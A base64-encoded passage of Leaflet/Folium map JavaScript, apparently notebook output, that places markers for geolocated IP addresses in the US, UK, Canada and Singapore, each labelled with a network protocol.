nNldEljb24oaWNvbl9lZDUxNjliMTY3ODk0ODMzYmQ1MzZiOWEzZWIxMTcxZSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF80NzNlOTQxNDg2NWU0N2I0YTM4MWVlZWRiNTg5ZDVmMSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzVhMjY2MDFmMmQwNTQ0ZTdhOTY5N2I5ZjU3ODNiNGE2ID0gJChgPGRpdiBpZD0iaHRtbF81YTI2NjAxZjJkMDU0NGU3YTk2OTdiOWY1NzgzYjRhNiIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVdhc2hpbmd0b24sIENpdHk9UmVkbW9uZCwgTG9uZ2l0dWRlPS0xMjIuMTIxNSwgTGF0aXR1ZGU9NDcuNjc0PGJyPjEzMS4xMDcuMTQ3LjgxPGJyPnByb3RvY29sPWh0dHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzQ3M2U5NDE0ODY1ZTQ3YjRhMzgxZWVlZGI1ODlkNWYxLnNldENvbnRlbnQoaHRtbF81YTI2NjAxZjJkMDU0NGU3YTk2OTdiOWY1NzgzYjRhNik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzJlMTdlMTY1YmJlNTQ1ZDY5YTVlNzg3NWEzZmEzMWU2LmJpbmRQb3B1cChwb3B1cF80NzNlOTQxNDg2NWU0N2I0YTM4MWVlZWRiNTg5ZDVmMSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfMmUxN2UxNjViYmU1NDVkNjlhNWU3ODc1YTNmYTMxZTYuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgUmVkbW9uZCwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzU0ZGM1MTdjNDk5ZDRkNjg4MGZkNDlhZTg5NDFiNWZkID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszNy43NTEsIC05Ny44MjJdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9lZmFhMTU4ZTBlMjQ0MDU3YmUyMzEwNDU4MjM1Y2Y4MSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl81NGRjNTE3YzQ5OWQ0ZDY4ODBmZDQ5YWU4OTQxYjVmZC5zZXRJY29uKGljb25fZWZhYTE1OGUwZTI0NDA1N2JlMjMxMDQ1ODIzNWNmODEpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfZGQ5Y2NkZGExZDE5NDg2ZjljYzE0NjQ1MDMwMGMwN2UgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9kMDE4NzFiMjM3MjU0ZTc1OTIyMTdmY2UxMGFjYWQ4MCA9ICQoYDxkaXYgaWQ9Imh0bWxfZDAxODcxYjIzNzI1NGU3NTkyMjE3ZmNlMTBhY2FkODAiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBMb25naXR1ZGU9LTk3LjgyMiwgTGF0aXR1ZGU9MzcuNzUxPGJyPjIwLjM4Ljk4LjE2NDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfZGQ5Y2NkZGExZDE5NDg2ZjljYzE0NjQ1MDMwMGMwN2Uuc2V0Q29udGVudChodG1sX2QwMTg3MWIyMzcyNTRlNzU5MjIxN2ZjZTEwYWNhZDgwKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfNTRkYzUxN2M0OTlkNGQ2ODgwZmQ0OWFlODk0MWI1ZmQuYmluZFBvcHVwKHBvcHVwX2RkOWNjZGRhMWQxOTQ4NmY5Y2MxNDY0NTAzMDBjMDdlKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl81NGRjNTE3YzQ5OWQ0ZDY4ODBmZDQ5YWU4OTQxYjVmZC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBOb25lLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2ExNDM0ZTg1ZWNlNDQwMjFiZWE3MDNjMzIwMWRjMTdhID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs1MS41MTQyLCAtMC4wOTMxXSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fMWQyNzY3Mjc1NjMwNDkyM2IyYTMxN2FjYzM1MGJjMjIgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfYTE0MzRlODVlY2U0NDAyMWJlYTcwM2MzMjAxZGMxN2Euc2V0SWNvbihpY29uXzFkMjc2NzI3NTYzMDQ5MjNiMmEzMTdhY2MzNTBiYzIyKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzMzODdkY2ZhMTQzYjQ5ZTU5NjMyNzE0YWZiZDAxZWI2ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfNTIwMmJlZjA1NmI5NDA4YjhhOTgyNzYzYTU4ODMwM2IgPSAkKGA8ZGl2IGlkPSJodG1sXzUyMDJiZWYwNTZiOTQwOGI4YTk4Mjc2M2E1ODgzMDNiIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1HQiwgQ291bnRyeU5hbWU9VW5pdGVkIEtpbmdkb20sIFN0YXRlPUVuZ2xhbmQsIENpdHk9TG9uZG9uLCBMb25naXR1ZGU9LTAuMDkzMSwgTGF0aXR1ZGU9NTEuNTE0Mjxicj45MS4xODkuOTQuNDxicj5wcm90b2NvbD1udHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzMzODdkY2ZhMTQzYjQ5ZTU5NjMyNzE0YWZiZDAxZWI2LnNldENvbnRlbnQoaHRtbF81MjAyYmVmMDU2Yjk0MDhiOGE5ODI3NjNhNTg4MzAzYik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2ExNDM0ZTg1ZWNlNDQwMjFiZWE3MDNjMzIwMWRjMTdhLmJpbmRQb3B1cChwb3B1cF8zMzg3ZGNmYTE0M2I0OWU1OTYzMjcxNGFmYmQwMWViNikKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfYTE0MzRlODVlY2U0NDAyMWJlYTcwM2MzMjAxZGMxN2EuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgTG9uZG9uLCBVbml0ZWQgS2luZ2RvbSwgcHJvdG9jb2w9bnRwYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfOGI4MWIzYjllNTY3NDlhMGJhN2FiZjA4N2ZjYjE4NDcgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzUxLjUxNDIsIC0wLjA5MzFdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl80ODgyYjYzMGU4MmI0NmIwODNhMzViMTRlZWJiODY1NiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl84YjgxYjNiOWU1Njc0OWEwYmE3YWJmMDg3ZmNiMTg0Ny5zZXRJY29uKGljb25fNDg4MmI2MzBlODJiNDZiMDgzYTM1YjE0ZWViYjg2NTYpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfZmY3MTg4MDAyMjRmNDU0ZTk5ZjE1Y2IwZTlkOWFjMjQgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF85YzY1ZDU3NGJmMzc0YzY1OGZjMjljMjhmY2NiODlkNCA9ICQoYDxkaXYgaWQ9Imh0bWxfOWM2NWQ1NzRiZjM3NGM2NThmYzI5YzI4ZmNjYjg5ZDQiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUdCLCBDb3VudHJ5TmFtZT1Vbml0ZWQgS2luZ2RvbSwgU3RhdGU9RW5nbGFuZCwgQ2l0eT1Mb25kb24sIExvbmdpdHVkZT0tMC4wOTMxLCBMYXRpdHVkZT01MS41MTQyPGJyPjkxLjE4OS44OC4xNTI8YnI+cHJvdG9jb2w9aHR0cDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfZmY3MTg4MDAyMjRmNDU0ZTk5ZjE1Y2IwZTlkOWFjMjQuc2V0Q29udGVudChodG1sXzljNjVkNTc0YmYzNzRjNjU4ZmMyOWMyOGZjY2I4OWQ0KTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfOGI4MWIzYjllNTY3NDlhMGJhN2FiZjA4N2ZjYjE4NDcuYmluZFBvcHVwKHBvcHVwX2ZmNzE4ODAwMjI0ZjQ1NGU5OWYxNWNiMGU5ZDlhYzI0KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl84YjgxYjNiOWU1Njc0OWEwYmE3YWJmMDg3ZmNiMTg0Ny5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBMb25kb24sIFVuaXRlZCBLaW5nZG9tLCBwcm90b2NvbD1odHRwYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfNDI0ZTM2ZTJkZTQ3NDcyY2FhYTE2MGY1ZjAyMjQ5N2MgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fMjY0NjVkYmZmZGNkNDlkMjg0NWFjNWY4NDRkYjNhNjAgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfNDI0ZTM2ZTJkZTQ3NDcyY2FhYTE2MGY1ZjAyMjQ5N2Muc2V0SWNvbihpY29uXzI2NDY1ZGJmZmRjZDQ5ZDI4NDVhYzVmODQ0ZGIzYTYwKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzI1MzViYTI1MDcyNjRmYTdhMWRlYzg0ZTAxZGQwYmRhID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfZGM1Y2ViNzBiOTkzNDU0ZWJlNTAwMjdiYmJmZWIwMTAgPSAkKGA8ZGl2IGlkPSJodG1sX2RjNWNlYjcwYjk5MzQ1NGViZTUwMDI3YmJiZmViMDEwIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1DQSwgQ291bnRyeU5hbWU9Q2FuYWRhLCBTdGF0ZT1PbnRhcmlvLCBDaXR5PVRvcm9udG8sIExvbmdpdHVkZT0tNzkuNDIwNCwgTGF0aXR1ZGU9NDMuNjY1NTxicj4xMy43MS4xNzIuMTMwPGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF8yNTM1YmEyNTA3MjY0ZmE3YTFkZWM4NGUwMWRkMGJkYS5zZXRDb250ZW50KGh0bWxfZGM1Y2ViNzBiOTkzNDU0ZWJlNTAwMjdiYmJmZWIwMTApOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl80MjRlMzZlMmRlNDc0NzJjYWFhMTYwZjVmMDIyNDk3Yy5iaW5kUG9wdXAocG9wdXBfMjUzNWJhMjUwNzI2NGZhN2ExZGVjODRlMDFkZDBiZGEpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzQyNGUzNmUyZGU0NzQ3MmNhYWExNjBmNWYwMjI0OTdjLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl83ZWUyYWQ5NWMwMzA0ODIwOGY1N2UwZWRhMTJhMTk5NyA9IEwubWFya2VyKAogICAgICAgICAgICBbNDMuNjY1NSwgLTc5LjQyMDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl8xYTExYmM5YzZjZTc0ODFlOGI1MTFjNTY1MWRiYzk5MSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl83ZWUyYWQ5NWMwMzA0ODIwOGY1N2UwZWRhMTJhMTk5Ny5zZXRJY29uKGljb25fMWExMWJjOWM2Y2U3NDgxZThiNTExYzU2NTFkYmM5OTEpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfNTU4Yjg4MDg2ODIxNDdkY2E5NGRhMWFlNzRiMDJjOTQgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF84M2RkMDY4NzUxMDA0ZDBmYjhmMzQ0NzRkOTA3M2I1MSA9ICQoYDxkaXYgaWQ9Imh0bWxfODNkZDA2ODc1MTAwNGQwZmI4ZjM0NDc0ZDkwNzNiNTEiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUNBLCBDb3VudHJ5TmFtZT1DYW5hZGEsIFN0YXRlPU9udGFyaW8sIENpdHk9VG9yb250bywgTG9uZ2l0dWRlPS03OS40MjA0LCBMYXRpdHVkZT00My42NjU1PGJyPjEzLjg4LjI1NS4xMTU8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzU1OGI4ODA4NjgyMTQ3ZGNhOTRkYTFhZTc0YjAyYzk0LnNldENvbnRlbnQoaHRtbF84M2RkMDY4NzUxMDA0ZDBmYjhmMzQ0NzRkOTA3M2I1MSk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzdlZTJhZDk1YzAzMDQ4MjA4ZjU3ZTBlZGExMmExOTk3LmJpbmRQb3B1cChwb3B1cF81NThiODgwODY4MjE0N2RjYTk0ZGExYWU3NGIwMmM5NCkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfN2VlMmFkOTVjMDMwNDgyMDhmNTdlMGVkYTEyYTE5OTcuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgVG9yb250bywgQ2FuYWRhLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzdlNGYyYzBmNDM5NjQ1YjdhNTU2ZDUyYjE0MmVlNDhkID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszOC43MTYzLCAtNzguMTcwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzJkZjM4OWY1ODdkMjQ2MDNhZmZmZDlmODI0OTE0Yzk4ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzdlNGYyYzBmNDM5NjQ1YjdhNTU2ZDUyYjE0MmVlNDhkLnNldEljb24oaWNvbl8yZGYzODlmNTg3ZDI0NjAzYWZmZmQ5ZjgyNDkxNGM5OCk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF9mN2I1NDQ1NGRlMWY0Yzg4YmQ2YTFmYjRmMWM2MTk4OCA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzc2OTA2NzM4YjViMTQ5MzM5NjdkNDIzZDUxMzgxMjU3ID0gJChgPGRpdiBpZD0iaHRtbF83NjkwNjczOGI1YjE0OTMzOTY3ZDQyM2Q1MTM4MTI1NyIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVZpcmdpbmlhLCBDaXR5PVdhc2hpbmd0b24sIExvbmdpdHVkZT0tNzguMTcwNCwgTGF0aXR1ZGU9MzguNzE2Mzxicj41Mi4xNjguNTAuNzk8YnI+cHJvdG9jb2w9aHR0cDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfZjdiNTQ0NTRkZTFmNGM4OGJkNmExZmI0ZjFjNjE5ODguc2V0Q29udGVudChodG1sXzc2OTA2NzM4YjViMTQ5MzM5NjdkNDIzZDUxMzgxMjU3KTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfN2U0ZjJjMGY0Mzk2NDViN2E1NTZkNTJiMTQyZWU0OGQuYmluZFBvcHVwKHBvcHVwX2Y3YjU0NDU0ZGUxZjRjODhiZDZhMWZiNGYxYzYxOTg4KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl83ZTRmMmMwZjQzOTY0NWI3YTU1NmQ1MmIxNDJlZTQ4ZC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfYWQyNGY2ZTIzNmFhNDI3NmI0YWUyY2JjZmY1MDQyOGIgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzEuMjkzMSwgMTAzLjg1NThdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl81MjZlNjc2NjQ3NTg0NTBiYWU0MDJiMTZhOGU4MGY3OSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl9hZDI0ZjZlMjM2YWE0Mjc2YjRhZTJjYmNmZjUwNDI4Yi5zZXRJY29uKGljb25fNTI2ZTY3NjY0NzU4NDUwYmFlNDAyYjE2YThlODBmNzkpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfYTU0NzQ4OTlhN2ViNGMxYWIxMTZiYThlNjE0MjkxMTUgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9kYjNlNTM5NzE2Y2Y0MmE5YjYwZDliNjZiN2FiMzgwZCA9ICQoYDxkaXYgaWQ9Imh0bWxfZGIzZTUzOTcxNmNmNDJhOWI2MGQ5YjY2YjdhYjM4MGQiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVNHLCBDb3VudHJ5TmFtZT1TaW5nYXBvcmUsIFN0YXRlPUNlbnRyYWwgU2luZ2Fwb3JlIENvbW11bml0eSBEZXZlbG9wbWVudCBDb3VuY2lsLCBDaXR5PVNpbmdhcG9yZSwgTG9uZ2l0dWRlPTEwMy44NTU4LCBMYXRpdHVkZT0xLjI5MzE8YnI+MTMuNjcuMzUuMTc2PGJyPnByb3RvY29sPWh0dHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2E1NDc0ODk5YTdlYjRjMWFiMTE2YmE4ZTYxNDI5MTE1LnNldENvbnRlbnQoaHRtbF9kYjNlNTM5NzE2Y2Y0MmE5YjYwZDliNjZiN2FiMzgwZCk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2FkMjRmNmUyMzZhYTQyNzZiNGFlMmNiY2ZmNTA0MjhiLmJpbmRQb3B1cChwb3B1cF9hNTQ3NDg5OWE3ZWI0YzFhYjExNmJhOGU2MTQyOTExNSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfYWQyNGY2ZTIzNmFhNDI3NmI0YWUyY2JjZmY1MDQyOGIuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgU2luZ2Fwb3JlLCBTaW5nYXBvcmUsIHByb3RvY29sPWh0dHBgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9hYTM0OWM4MGJjNTI0OGRjYmY5ZjFhNDAzODFmZDRmOSA9IEwubWFya2VyKAogICAgICAgICAgICBbMzcuNzUxLCAtOTcuODIyXSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fODgwYzdjMjM3ZGNmNDAwYmFiYTNmZmEyO